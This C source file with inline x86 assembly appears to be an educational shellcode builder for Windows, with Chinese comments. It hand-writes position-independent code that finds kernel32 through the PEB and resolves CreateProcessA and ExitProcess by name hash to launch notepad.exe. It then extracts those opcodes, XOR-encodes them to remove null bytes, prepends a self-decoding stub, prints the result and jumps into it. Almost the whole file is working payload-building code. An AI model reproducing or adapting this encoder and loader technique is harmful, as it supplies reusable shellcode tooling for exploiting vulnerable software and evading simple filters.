#include "stdio.h"
#include "stdlib.h"
#include "windows.h"
#define MAX_OPCODE_LEN  0x2000

//  模拟缓冲区溢出漏洞，并用shellcode进行攻击. Do not use ((void (*)())code)();
void doShellcode(char * code)
{
    __asm
    {
    begin_proc:
        call    vul_function;    // call vulnerabile function
        jmp     code;   // do the shellcode
        jmp     end_proc;
      vul_function:
        ret;    // now, the buffer is overflow, and ret to the shellcode
    end_proc:;
    }
}

char decode1[] =
"\xeb\x0e\x5b\x53\x4b\x33\xc9\xb1\xff"
"\x80\x34\x0b\xee\xe2\xfa\xc3\xe8\xed\xff\xff\xff";
char decode2[] =
"\xeb\x10\x5b\x53\x4b\x33\xc9\x66\xb9\xdd\xff"
"\x80\x34\x0b\xee\xe2\xfa\xc3\xe8\xeb\xff\xff\xff";

#define EIGHT_NOPS __asm  _emit 0x90 __asm  _emit 0x90 __asm  _emit 0x90 __asm  _emit 0x90\
                   __asm  _emit 0x90 __asm  _emit 0x90 __asm  _emit 0x90 __asm  _emit 0x90
#define PROC_BEGIN  EIGHT_NOPS
#define PROC_END    EIGHT_NOPS

unsigned long doCommandLineAsm()
//  hash(CreateProcessA)=0x6ba6bcc9
//  Addr=0x7C823E8F	hash=0xff0d6657	name=CloseHandle
//  0185: 	Addr=0x7C826919	hash=0x4fd18963	name=ExitProcess
{
/*    
    unsigned long lFunctionPtr=0;
    unsigned long lHashOfFuncName=0;

    lHashOfFuncName = GetHash("CloseHandle");
    lHashOfFuncName = GetHash("ExitProcess");
*/
    long lMyAddress;
    __asm
    {
        jmp near  next_call;
      proc001:
        ret;
    next_call:
      call    proc001;
        mov     eax,[esp-4];//获得这条指令的地址
        mov     lMyAddress,eax;
    }	//  lMyAddress=指令mov eax,[esp-4];的地址
    return lMyAddress;

//==============================================================================
    __asm{
    PROC_BEGIN;     // Begin of the code
        push    00657865h   ;
        push    2e646170h   ;
        push    65746f6eh   ; "notepad.exe"
        mov     edi, esp    ; edi="notepad.exe"
        push    0xff0d6657  ; //hash("CloseHandle")=0xff0d6657
        push    0x4fd18963  ; //hash("ExitProcess")=0x4fd18963
        push    0x6ba6bcc9  ; //hash(CreateProcessA)=0x6ba6bcc9

        // Begin: Get the process address for call+++++++++++++++++
        pop     edx;        ; //edx=GetHash("CreateProcessA");
        call    findHashFuncAddrProc;   // eax=address of function
        //mov     lFunctionPtr,eax;       // store address to lFunctionPtr
        mov     esi,eax;    ;// esi=CreateProcessA
        pop     edx;        ;// edx=GetHash("ExitProcess");
        //  call some functions to do the job.
        call    findHashFuncAddrProc;   // eax=address of function
        //mov     lFunctionPtr,eax;     // store address to lFunctionPtr
        mov     ebx,eax;    ;// ebx=CloseHandle
        // End: Get the process address for call ----------------

        call    doCommandProc;          // eax

        jmp     end_of_this_function;    // finish all job. 
   
//  Define some sub processes here.  ===========================================
    // begin of doCommandProc    =====================================
    // in: edi=szCmdLine, esi=procAddr. out: eax=return value, result of call
doCommandProc:
        push    ecx;
        push    edx;
        push    esi;
        push    edi;
        push    ebp;
        mov     ebp,esp;

        mov     edx,edi;    //edx=szCmdLine
        sub     esp, 54h;
        mov     edi, esp;
        push    14h;
        pop     ecx;
        xor     eax,eax;
        stack_zero:
        mov     [edi+ecx*4], eax;
        loop    stack_zero;

        mov     byte ptr [edi+10h], 44h         ; si.cb = sizeof(si)
//        inc     byte ptr [edi+3Ch]              ; si.dwFlags = 0x100
//        inc     byte ptr [edi+3Dh]              ; dwFlags
//        mov     [edi+48h], ebx                  ; si.hStdInput = socket
//        mov     [edi+4Ch], ebx                  ; hStdOutput = socket
//        mov     [edi+50h], ebx                  ; hStdError = socket
//    si.wShowWindow=TRUE;
//    si.dwFlags=STARTF_USESHOWWINDOW;

        lea     eax, [edi+10h]
        push    edi;    //push    piPtr;
        push    eax;    //push    siPtr;
        push    NULL;
        push    NULL;
        push    0;
        push    FALSE;
        push    NULL;
        push    NULL;
        push    edx;    //edx=szCmdLine
        push    NULL;
        call    esi;    //eax=return value;ptrCreateProcessA;
        cmp     eax,0;
        je     donot_closehandle;
        push    eax;
        call    ebx;    //ExitProcess;

//        mov     eax,[edi];  
//        push    eax;
//        call    ebx;    //CloseHandle(pi.hProcess);
//        mov     eax,[edi+4h];
//        push    eax;
        //call    ebx;    //CloseHandle(pi.hThread);
/*
typedef struct _PROCESS_INFORMATION { //4x4
  HANDLE hProcess;      //+00h need to close;
  HANDLE hThread;       //+04h nede to close;
  DWORD  dwProcessId;   //+08h
  DWORD  dwThreadId;    //+0ch
} PROCESS_INFORMATION, *LPPROCESS_INFORMATION;
    if(ret)
    {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

*/
      donot_closehandle:
        mov     esp,ebp;
        pop     ebp;
        pop     edi;
        pop     esi;
        pop     edx;
        pop     ecx;
        retn;
    // end of doCommandProc  ==================================

    // begin of findHashFuncAddrProc    ==============================
    // in: ecx = DLL nIndex, edx=lHash. out: eax=return value
    findHashFuncAddrProc:
        push    esi;
        push    ebx;
        push    ecx;
        push    edx;
        call    get_base_address;
        cmp     eax,0   ;   // the base address is 0, done.
        jle     end_of_findHashFuncAddrProc; if ecx <=0 done.
        mov     ebx,eax ;   // save the base to ebx;
        call    get_function_addr;
    end_of_findHashFuncAddrProc:
        pop     edx;
        pop     ecx;
        pop     ebx;
        pop     esi;
        retn;
    // end of findHashFuncAddrProc  ==================================

    // begin of get_base_address    ==================================
    // get_base_address: put the DLL nIndex to ecx. eax=return value
    get_base_address:
        mov     eax, fs:30h     ; PEB base
        mov     eax, [eax+0ch]  ; PEB_LER_DATA
        // base of first element
        mov     eax,[eax+1ch]  ; The first element of InInitOrderModuleList
        mov     eax,[eax]       ; Next element
        mov     eax,[eax+8]     ; eax = Base address of the module
        retn;
    // end of get_base_address  ======================================

    // begin of get_function_addr    =================================
    // get_function_addr, in: ebx=base, edx=hash(name); out:eax=return value
    get_function_addr:
        // get the addrs of first function =========
        mov     eax,[ebx+3ch]       ; e_lfanew
        mov     eax,[eax+ebx+78h]   ; DataDirectory[0]
        add     eax,ebx             ; RVA + base
        mov     esi,eax             ; Save first DataDirectory to esi
        // get fields of IMAGE_EXPORT_DIRECTORY pNameOfModule
        //mov     eax,[esi+0ch]       ; Name RVA, real address should "add eax,ebx"
        //mov     eax,[esi+14h]       ; NumberOfFunctions
        //mov     eax,[esi+18h]       ; NumberOfNames
        //mov     eax,[esi+1ch]       ; AddressOfFunctions RVA
        //mov     eax,[esi+20h]       ; AddressOfNames RVA
        //mov     eax,[esi+24h]       ; AddressOfNameOrdinals RVA
        mov     ecx,[esi+18h]           ; NumberOfNames
    compare_names_hash:
        mov     eax, [esi+20h]          ; AddressOfNames RVA
        add     eax, ebx                ; rva2va
        mov     eax, [eax+ecx*4-4]      ; NamesAddress RVA
        add     eax, ebx                ; rva2va, now eax store the address of the name

        push    edi                     ; save edi to stack
        mov     edi,eax                 ; put the address of the string to edi
        call    hash_proc;              ; gethash
        pop     edi                     ; restor edi from stack
        
        cmp     eax,edx;                ; compare to hash;
        je      done_find_hash;
        //cmp     ebx, [edi]                      ; compare to hash
        //jnz     short find_start
    loop compare_names_hash;
        xor     eax,eax;
        jmp     done_get_function_addr;
    done_find_hash:
        mov     eax, [esi+1ch]          ; AddressOfFunctions RVA
        add     eax, ebx                ; rva2va
        mov     eax, [eax+ecx*4-4]      ; FunctionAddress RVA
        add     eax, ebx                ; rva2va, now eax store the address of the Function
    done_get_function_addr:
        retn;
    // end of get_function_addr ======================================

    // begin of hash_process    ======================================
    //hash_proc: you should put the address of the string to edi
    //when ret, the hash value stores in eax
    hash_proc:
        // save ebx,ecx,edx,edi
        push    ebx         ;
        push    ecx         ;
        push    edx         ;
        push    edi         ;
        xor     edx,edx     ; edx = h
    hash_loop:              ;
        movsx   eax,byte ptr [edi]  ; [eax]=*c ==> eax
        cmp     eax,0       ;
      je  exit_hash_proc    ;
        mov     ebx,edx     ;  h ==> ebx
        mov     ecx,edx     ;  h ==> ecx
        shl     ebx,19h     ; h << 25
        shr     ecx,7       ; ( h >> 7 )
        or      ebx,ecx     ; ( ( h << 25 ) | ( h >> 7 ) )
        mov     edx,ebx     ;
        add     edx,eax     ;
        inc     edi;        ;
    jmp hash_loop           ;
    exit_hash_proc:         ;
        mov     eax,edx     ; save hash to eax
        // restore ebx,ecx,edx,edi
        pop     edi         ;
        pop     edx         ;
        pop     ecx         ;
        pop     ebx         ;
        retn                ;
    // end of hash_process    ========================================
//==============================================================================
end_of_this_function:
        //mov lHashFunAddr,eax;
    PROC_END;   // End of the code
    };
//    printf("\tHash=0x%.8x  addr=0x%p\n",lHashOfFuncName, lFunctionPtr);
    return lMyAddress;
}

void PrintStrCode(unsigned char *lpBuff, int buffsize)
{
    int i,j;    char *p;    char msg[4];
    printf("/* %d=0x%x bytes */\n",buffsize,buffsize);
    for(i=0;i<buffsize;i++)
    {
        if((i%16)==0)
            if(i!=0)  printf("\"\n\"");
            else
                printf("\"");
        printf("\\x%.2x",lpBuff[i]&0xff);
    }
    printf("\";\n");
}
int EncOpcode(unsigned char * Opcode_buff, int opcode_len, unsigned char xorByte)
//  in: Opcode_buff,opcode_len,xorByte; 
//  out: encoded Opcode_buff
{
    int i;

    if(xorByte==0){
        puts("The xorByte cannot be zero."); return 0;
    }
    for(i=0;i<opcode_len;i++){
        Opcode_buff[i]=Opcode_buff[i]^xorByte;
    }
    Opcode_buff[opcode_len]=0;

    return opcode_len;
}
int GetProcOpcode(unsigned char * funPtr, unsigned char  * Opcode_buff)
//  in: funPtr; out: "return value=length of Opcode_buff" and Opcode_buff
{
    char  *fnbgn_str="\x90\x90\x90\x90\x90\x90\x90\x90\x90";
    char  *fnend_str="\x90\x90\x90\x90\x90\x90\x90\x90\x90";

    int i,sh_len;

    for (i=0;i<MAX_OPCODE_LEN;i++ ) {
        if(memcmp((unsigned char  *)(funPtr+i),fnbgn_str, 8)==0) break;
    }
    funPtr+=(i+8);   // start of the ShellCode
    for (i=0;i<MAX_OPCODE_LEN;i++) {
        if(memcmp((unsigned char  *)(funPtr+i),fnend_str, 8)==0) break;
    }
    sh_len=i; // length of the ShellCode
    memcpy(Opcode_buff, (unsigned char  *)funPtr, sh_len);

    return sh_len;
}

unsigned char findXorByte(unsigned char Buff[], int buf_len)
{
    unsigned char xorByte=0;
    int i,j,k;
    for(i=0xff; i>0; i--)
    {
        k=0;
        for(j=0;j<buf_len;j++)
        {
            if((Buff[j]^i)==0)
            {
                k++;break;
            }
        }
        if(k==0)
        {//find the xor byte
            xorByte=i; break;
        }
    }
    return xorByte;
}

long GetShellcode()
{
    unsigned char  opcode_Buff[MAX_OPCODE_LEN];
    char shellcode[MAX_OPCODE_LEN];
    int opcode_len=0,encode_len,i,decode_len;
    unsigned char Enc_key;
    unsigned long lPtr;

    // 获得原始的二进制代码
    lPtr = doCommandLineAsm() ;
    opcode_len=GetProcOpcode((unsigned char *)lPtr, opcode_Buff);
    PrintStrCode(opcode_Buff, opcode_len);
    //doShellcode((char *)opcode_Buff);
    //return 0;

    // 找到XOR字节并编码shellcode
    Enc_key = findXorByte(opcode_Buff, opcode_len);
    printf("\tXorByte=0x%.2x\n", Enc_key);
    encode_len=EncOpcode(opcode_Buff, opcode_len, Enc_key);
    PrintStrCode(opcode_Buff, opcode_len);
    if(encode_len==strlen((char *)opcode_Buff)){
        puts("\tSuccess: encode is OK\n");
    }else{ puts("\tFail: encode is OK\n"); return 0;}
    //return 0;
    
    // 加上解码程序
    if(encode_len<256){// strlen(opcode_Buff)<256，用decode1解码
        decode_len = strlen(decode1);

        for(i=0;i<decode_len;i++){
            shellcode[i]=decode1[i];
        }
        shellcode[8]=encode_len;
        shellcode[12]=Enc_key;

        for(i=0;i<encode_len;i++){
            shellcode[i+decode_len]=opcode_Buff[i];
        }
    }else{// strlen(opcode_Buff)>=256，用decode2解码
        decode_len = strlen(decode2);

        for(i=0;i<decode_len;i++){
            shellcode[i]=decode2[i];
        }
        shellcode[9] =encode_len % 0x100;
        shellcode[10]=encode_len/0x100;
        shellcode[14]=Enc_key;

        for(i=0;i<encode_len;i++){
            shellcode[i+decode_len]=opcode_Buff[i];
        }
    }

    printf("\n\nlength of shellcode = %d = 0x%x\n",strlen(shellcode),strlen(shellcode));
    PrintStrCode((unsigned char*)shellcode, strlen(shellcode));
    
    doShellcode(shellcode);

    return lPtr;
}


void main(int argc, char * argv[])
{
    GetShellcode();
}